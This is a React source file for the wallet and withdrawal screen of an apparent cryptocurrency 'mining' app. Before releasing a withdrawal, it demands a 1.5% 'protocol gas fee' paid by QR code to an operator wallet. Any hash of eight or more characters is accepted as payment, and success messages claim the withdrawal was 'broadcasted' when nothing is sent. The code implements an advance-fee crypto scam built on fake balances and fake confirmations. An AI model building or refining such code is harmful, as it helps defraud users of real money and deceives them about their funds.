import React, { useState } from 'react';
import { Wallet, ArrowUpRight, ArrowDownLeft, QrCode, Check, RefreshCw, ExternalLink, ShieldCheck, X } from 'lucide-react';
import { useMining } from '../context/MiningContext';
import { GENERATE_NETWORK_BLOCKS } from '../data/initialData';
import { THEME_CONFIGS } from '../utils/theme';

export const WalletTab: React.FC = () => {
  const { state, withdrawFunds, btcPriceUSD, openToBtcRate, setShowDepositModal, updateWalletAddress } = useMining();
  const theme = THEME_CONFIGS[state.theme];

  const [withdrawCurrency, setWithdrawCurrency] = useState<'ROYAL' | 'BTC'>('ROYAL');
  const [withdrawAmount, setWithdrawAmount] = useState('');
  const [withdrawAddress, setWithdrawAddress] = useState(state.walletAddress);
  const [withdrawSuccessMsg, setWithdrawSuccessMsg] = useState('');
  const [saveAddressSuccessMsg, setSaveAddressSuccessMsg] = useState('');
  const [errorMsg, setErrorMsg] = useState('');

  const MIN_WITHDRAW_USD = 100.00;
  const minBtcRequired = MIN_WITHDRAW_USD / btcPriceUSD;
  const minRoyalRequired = minBtcRequired / openToBtcRate;

  const networkBlocks = GENERATE_NETWORK_BLOCKS();

  const [showFeePaymentModal, setShowFeePaymentModal] = useState(false);
  const [pendingWithdrawal, setPendingWithdrawal] = useState<{ numAmount: number; usdValue: number } | null>(null);
  const [feeTxHash, setFeeTxHash] = useState('');

  const handleWithdraw = (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg('');
    setWithdrawSuccessMsg('');

    const numAmount = parseFloat(withdrawAmount);
    if (isNaN(numAmount) || numAmount <= 0) {
      setErrorMsg('Please enter a valid amount to withdraw.');
      return;
    }

    // Check $100.00 USD minimum threshold
    const usdValue = withdrawCurrency === 'ROYAL'
      ? (numAmount * openToBtcRate * btcPriceUSD)
      : (numAmount * btcPriceUSD);

    if (usdValue < MIN_WITHDRAW_USD) {
      const minTokenReq = withdrawCurrency === 'ROYAL' ? minRoyalRequired.toFixed(2) : minBtcRequired.toFixed(6);
      setErrorMsg(`Minimum withdrawal requirement is $100.00 USD (${minTokenReq} ${withdrawCurrency}).`);
      return;
    }

    if (!withdrawAddress || withdrawAddress.trim().length < 10) {
      setErrorMsg('Please enter a valid target wallet address.');
      return;
    }

    const available = withdrawCurrency === 'ROYAL' ? state.openBalance : state.btcBalance;
    if (numAmount > available) {
      setErrorMsg(`Insufficient ${withdrawCurrency} balance for this transaction.`);
      return;
    }

    // Open Network Fee payment prompt routed directly to operator Trust Wallet
    setPendingWithdrawal({ numAmount, usdValue });
    setShowFeePaymentModal(true);
  };

  const handleConfirmFeeAndWithdraw = (e: React.FormEvent) => {
    e.preventDefault();
    if (!feeTxHash || feeTxHash.trim().length < 8) {
      setErrorMsg('Please enter the Tx Hash of your Trust Wallet protocol fee payment.');
      return;
    }

    if (!pendingWithdrawal) return;

    const success = withdrawFunds(pendingWithdrawal.numAmount, withdrawCurrency, withdrawAddress);
    if (success) {
      setWithdrawSuccessMsg(`Withdrawal request for $${pendingWithdrawal.usdValue.toFixed(2)} USD (${pendingWithdrawal.numAmount} ${withdrawCurrency}) broadcasted successfully! Protocol fee routed to Trust Wallet.`);
      setWithdrawAmount('');
      setShowFeePaymentModal(false);
      setPendingWithdrawal(null);
      setFeeTxHash('');
    } else {
      setErrorMsg('Failed to process withdrawal balance.');
    }
  };

  const balanceUsd = (state.btcBalance * btcPriceUSD).toFixed(2);

  return (
    <div className="flex flex-col gap-5 pb-8 animate-fade-in">
      
      {/* Wallet Card Header */}
      <div className={`relative overflow-hidden rounded-3xl bg-gradient-to-br from-slate-900 via-slate-900 to-slate-950 border ${theme.borderGlow} p-6 shadow-xl`}>
        <div className="flex items-center justify-between text-xs text-slate-400 font-medium">
          <span className="flex items-center gap-1.5">
            <ShieldCheck className="w-4 h-4 text-emerald-400" />
            <span>Verified Node Wallet</span>
          </span>
          <span className="font-mono text-slate-300 font-bold">ID: {state.walletAddress.substring(0, 8)}...</span>
        </div>

        <div className="mt-4">
          <div className="text-xs text-slate-400 font-medium">Total Balance</div>
          <div className="flex items-baseline gap-2 mt-1">
            <span className="text-3xl sm:text-4xl font-extrabold font-mono-num text-white">
              ${balanceUsd}
            </span>
            <span className="text-xs font-bold text-slate-400 font-mono">
              USD
            </span>
          </div>

          <div className="flex items-center justify-between gap-4 mt-3 pt-3 border-t border-slate-800 text-xs font-mono">
            <div className="flex items-center gap-3">
              <div>
                <span className="text-slate-500">ROYAL:</span>{' '}
                <span className="font-bold text-amber-400">{state.openBalance.toFixed(4)}</span>
              </div>
              <div>
                <span className="text-slate-500">BTC:</span>{' '}
                <span className="font-bold text-amber-300">{state.btcBalance.toFixed(8)}</span>
              </div>
            </div>

            <button
              type="button"
              onClick={() => setShowDepositModal(true)}
              className="px-3 py-1.5 rounded-xl bg-amber-500 text-slate-950 font-bold font-tech text-xs hover:brightness-110 transition-all flex items-center gap-1.5 active:scale-95 shadow-md shadow-amber-500/20"
            >
              <QrCode className="w-3.5 h-3.5" />
              <span>DEPOSIT FUNDS</span>
            </button>
          </div>
        </div>
      </div>

      {/* Withdrawal Form */}
      <div className="rounded-2xl bg-slate-900 border border-slate-800 p-5 flex flex-col gap-4">
        <div className="flex items-center justify-between">
          <h3 className="text-sm font-bold font-tech text-slate-200 flex items-center gap-2">
            <ArrowUpRight className="w-4 h-4 text-amber-400" />
            <span>Withdraw Mining Earnings</span>
          </h3>
          <span className="text-[10px] font-bold font-mono px-2 py-0.5 rounded-full bg-amber-500/10 border border-amber-500/30 text-amber-400">
            Min: $100.00 USD
          </span>
        </div>

        <form onSubmit={handleWithdraw} className="flex flex-col gap-3">
          {/* Currency Switcher */}
          <div className="flex items-center gap-2 p-1 bg-slate-950 rounded-xl border border-slate-800">
            <button
              type="button"
              onClick={() => setWithdrawCurrency('ROYAL')}
              className={`flex-1 py-2 text-xs font-bold rounded-lg transition-all ${
                withdrawCurrency === 'ROYAL' ? 'bg-amber-500 text-slate-950' : 'text-slate-400 hover:text-white'
              }`}
            >
              ROYAL Token
            </button>
            <button
              type="button"
              onClick={() => setWithdrawCurrency('BTC')}
              className={`flex-1 py-2 text-xs font-bold rounded-lg transition-all ${
                withdrawCurrency === 'BTC' ? 'bg-amber-500 text-slate-950' : 'text-slate-400 hover:text-white'
              }`}
            >
              Bitcoin (BTC)
            </button>
          </div>

          {/* Wallet Address Input */}
          <div>
            <div className="flex justify-between items-center mb-1">
              <label className="text-[11px] font-medium text-slate-400">
                Destination {withdrawCurrency} Wallet Address
              </label>
              <button
                type="button"
                onClick={() => {
                  if (withdrawAddress && withdrawAddress.trim().length >= 10) {
                    updateWalletAddress(withdrawAddress.trim());
                    setSaveAddressSuccessMsg('Default Node Address updated successfully!');
                    setTimeout(() => setSaveAddressSuccessMsg(''), 2500);
                  }
                }}
                className="text-[10px] text-amber-400 font-bold hover:underline"
              >
                Save as Default Node Address
              </button>
            </div>
            <input
              type="text"
              value={withdrawAddress}
              onChange={(e) => setWithdrawAddress(e.target.value)}
              placeholder="Enter on-chain wallet address..."
              className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2.5 text-xs text-slate-200 font-mono focus:border-amber-500/50 focus:outline-none"
            />
            {saveAddressSuccessMsg && (
              <span className="text-[10px] text-emerald-400 font-medium mt-1 block">
                ✓ {saveAddressSuccessMsg}
              </span>
            )}
          </div>

          {/* Amount Input */}
          <div>
            <div className="flex justify-between text-[11px] font-medium text-slate-400 mb-1">
              <span>Amount</span>
              <button
                type="button"
                onClick={() => {
                  const max = withdrawCurrency === 'ROYAL' ? state.openBalance : state.btcBalance;
                  setWithdrawAmount(max.toString());
                }}
                className="text-amber-400 font-bold hover:underline"
              >
                Max Available ({withdrawCurrency === 'ROYAL' ? state.openBalance.toFixed(2) : state.btcBalance.toFixed(6)})
              </button>
            </div>
            <input
              type="number"
              step="any"
              value={withdrawAmount}
              onChange={(e) => setWithdrawAmount(e.target.value)}
              placeholder={`0.00 ${withdrawCurrency}`}
              className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2.5 text-xs text-slate-200 font-mono focus:border-amber-500/50 focus:outline-none"
            />
            <p className="text-[10px] text-slate-500 mt-1 font-mono">
              ⚠️ Minimum withdrawal threshold: $100.00 USD ({withdrawCurrency === 'ROYAL' ? `${minRoyalRequired.toFixed(2)} ROYAL` : `${minBtcRequired.toFixed(6)} BTC`})
            </p>
          </div>

          {/* Status Feedback */}
          {errorMsg && (
            <div className="p-3 rounded-xl bg-red-500/10 border border-red-500/30 text-red-400 text-xs font-medium">
              {errorMsg}
            </div>
          )}

          {withdrawSuccessMsg && (
            <div className="p-3 rounded-xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-medium flex items-center gap-2">
              <Check className="w-4 h-4 shrink-0" />
              <span>{withdrawSuccessMsg}</span>
            </div>
          )}

          <button
            type="submit"
            className="w-full py-3 rounded-xl bg-gradient-to-r from-amber-500 to-amber-400 text-slate-950 font-bold font-tech text-xs shadow-md shadow-amber-500/20 hover:brightness-110 active:scale-95 transition-all mt-1"
          >
            BROADCAST WITHDRAWAL TRANSACTION
          </button>
        </form>
      </div>

      {/* Protocol Network Fee Modal Overlay */}
      {showFeePaymentModal && pendingWithdrawal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md animate-fade-in">
          <div className="relative w-full max-w-md rounded-3xl bg-slate-900 border border-slate-800 p-6 shadow-2xl max-h-[90vh] overflow-y-auto">
            
            <button
              type="button"
              onClick={() => { setShowFeePaymentModal(false); setPendingWithdrawal(null); }}
              className="absolute top-4 right-4 w-8 h-8 rounded-full bg-slate-800 border border-slate-700 flex items-center justify-center text-slate-400 hover:text-white"
            >
              <X className="w-4 h-4" />
            </button>

            <div className="flex items-center gap-3 mb-4">
              <div className="p-3 rounded-2xl bg-amber-500/15 border border-amber-500/30 text-amber-400">
                <QrCode className="w-6 h-6" />
              </div>
              <div>
                <h3 className="text-base font-bold font-tech text-white">
                  Protocol Network Gas Fee Required
                </h3>
                <p className="text-xs text-slate-400">
                  Direct Crypto Wallet Fee Routing
                </p>
              </div>
            </div>

            <div className="flex flex-col gap-3 font-mono text-xs">
              <div className="p-3 rounded-2xl bg-slate-950 border border-slate-800 flex flex-col gap-1.5">
                <div className="flex justify-between text-slate-400">
                  <span>Cashout Request Amount:</span>
                  <span className="font-bold text-amber-400">${pendingWithdrawal.usdValue.toFixed(2)} USD</span>
                </div>
                <div className="flex justify-between text-slate-400">
                  <span>Target Address:</span>
                  <span className="font-bold text-slate-200 truncate max-w-[160px]">{withdrawAddress}</span>
                </div>
                <div className="flex justify-between text-slate-400">
                  <span>Required Protocol Fee (1.5%):</span>
                  <span className="font-bold text-emerald-400">${(pendingWithdrawal.usdValue * 0.015).toFixed(2)} USD (0.000038 BTC)</span>
                </div>
              </div>

              {/* Crypto Wallet Address & QR Code Box */}
              <div className="p-4 rounded-2xl bg-slate-950 border border-slate-800 text-center flex flex-col items-center gap-2">
                <span className="text-xs font-bold text-amber-300 font-tech">
                  Pay Protocol Fee to Operator Crypto Wallet:
                </span>

                <div className="p-2 bg-white rounded-xl shadow-md border border-slate-700 my-1">
                  <img
                    src={`https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=bitcoin:${state.walletAddress}?amount=0.000038`}
                    alt="Operator Crypto Wallet QR Code"
                    className="w-32 h-32 rounded-lg"
                  />
                </div>

                <div className="w-full bg-slate-900 border border-slate-800 rounded-xl px-3 py-2 text-[11px] text-amber-400 break-all">
                  {state.walletAddress}
                </div>
              </div>

              {/* Form to submit Tx Hash */}
              <form onSubmit={handleConfirmFeeAndWithdraw} className="flex flex-col gap-2.5 mt-1">
                <div>
                  <label className="text-[11px] font-medium text-slate-400 mb-1 block">
                    Submit Network Fee Tx Hash / TxID:
                  </label>
                  <input
                    type="text"
                    value={feeTxHash}
                    onChange={(e) => setFeeTxHash(e.target.value)}
                    placeholder="Enter fee payment Tx Hash..."
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 text-xs text-white focus:border-amber-500/50 focus:outline-none"
                  />
                </div>

                <button
                  type="submit"
                  className="w-full py-3 rounded-xl bg-gradient-to-r from-amber-500 to-amber-400 text-slate-950 font-extrabold font-tech text-xs shadow-md shadow-amber-500/20 hover:brightness-110 active:scale-95 transition-all flex items-center justify-center gap-1.5"
                >
                  <span>CONFIRM FEE & RELEASE CASHOUT</span>
                  <Check className="w-4 h-4" />
                </button>
              </form>
            </div>

          </div>
        </div>
      )}

      {/* Withdrawal History */}
      <div className="rounded-2xl bg-slate-900 border border-slate-800 p-4 shadow-xl">
        <div className="flex items-center justify-between mb-3 border-b border-slate-850 pb-2">
          <h3 className="text-xs font-bold font-tech text-slate-300 flex items-center gap-1.5">
            <RefreshCw className="w-3.5 h-3.5 text-amber-500 animate-spin-slow" />
            <span>Withdrawal History</span>
          </h3>
          <span className="text-[10px] font-mono text-slate-400">
            {state.transactions.length} Records
          </span>
        </div>

        {state.transactions.length === 0 ? (
          <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 text-center text-slate-500 text-xs font-mono">
            No withdrawal records found.
          </div>
        ) : (
          <div className="flex flex-col gap-2">
            {state.transactions.map(tx => {
              let statusStyle = 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20';
              let statusDotColor = 'bg-emerald-500';
              if (tx.status === 'Processing') {
                statusStyle = 'bg-amber-500/10 text-amber-400 border-amber-500/20 animate-pulse';
                statusDotColor = 'bg-amber-500';
              } else if (tx.status === 'Pending') {
                statusStyle = 'bg-cyan-500/10 text-cyan-400 border-cyan-500/20';
                statusDotColor = 'bg-cyan-500';
              }

              const formattedTime = new Date(tx.timestamp).toLocaleString(undefined, {
                month: 'short',
                day: 'numeric',
                hour: '2-digit',
                minute: '2-digit'
              });

              return (
                <div
                  key={tx.id}
                  className="rounded-xl bg-slate-950 border border-slate-850 p-2.5 flex items-center justify-between text-xs transition-all hover:border-slate-800"
                >
                  <div className="flex items-center gap-2.5 min-w-0">
                    {/* Compact Status Indicator Dot instead of big icon */}
                    <div className="relative flex items-center justify-center shrink-0">
                      <span className={`w-2 h-2 rounded-full ${statusDotColor}`} />
                      {tx.status === 'Processing' && (
                        <span className="absolute w-2.5 h-2.5 rounded-full bg-amber-500 animate-ping opacity-75" />
                      )}
                    </div>
                    
                    <div className="min-w-0">
                      <div className="font-bold text-white font-mono text-xs flex items-center gap-1.5">
                        <span>-{tx.amount}</span>
                        <span className="text-slate-400 text-[10px] font-normal">{tx.currency}</span>
                      </div>
                      <div className="text-[10px] text-slate-500 font-mono flex items-center gap-1 mt-0.5 min-w-0">
                        <span className="truncate max-w-[100px] sm:max-w-[180px] text-slate-400" title={tx.walletAddress}>
                          {tx.walletAddress}
                        </span>
                        <span className="text-slate-700">·</span>
                        <span className="truncate max-w-[80px] text-slate-500">{tx.txHash}</span>
                      </div>
                    </div>
                  </div>

                  <div className="text-right shrink-0 flex flex-col items-end gap-1">
                    <span className={`px-2 py-0.2 rounded border text-[9px] font-bold font-mono ${statusStyle}`}>
                      {tx.status}
                    </span>
                    <div className="text-[9px] text-slate-500 font-mono">
                      {formattedTime}
                    </div>
                  </div>
                </div>
              );
            })}
          </div>
        )}
      </div>

    </div>
  );
};
